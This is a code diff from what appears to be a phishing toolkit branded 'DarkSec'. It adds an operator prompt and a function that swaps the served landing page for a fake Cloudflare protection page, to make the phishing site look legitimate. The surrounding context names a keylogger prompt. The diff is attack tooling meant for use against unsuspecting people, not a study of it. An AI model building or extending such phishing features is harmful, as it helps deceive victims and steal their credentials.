@@ -492,6 +492,30 @@ def inputCustom(): #Question where user can input custom web-link
          f.write(c)
          f.close()
 
+def cloudfarePrompt():
+	system('clear')
+	print (_('''{1}
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {1}http://github.com/darksecdevelopers
+        {0}** BY: {1}DARKSEC {0}**
+''').format(MAIN0, MAIN2))
+	print(_("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+	
+def addingCloudfare():
+        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
+        if choice == 'y' or choice == 'Y':
+           addCloudfare()
+        else:
+            sleep(1)           
+           
+def addCloudfare():
+         system('cp Server/www/index.html Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
+         print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
+         sleep(2)
+		
 def keyloggerprompt():
 	system('clear')
 	print (_('''{1}
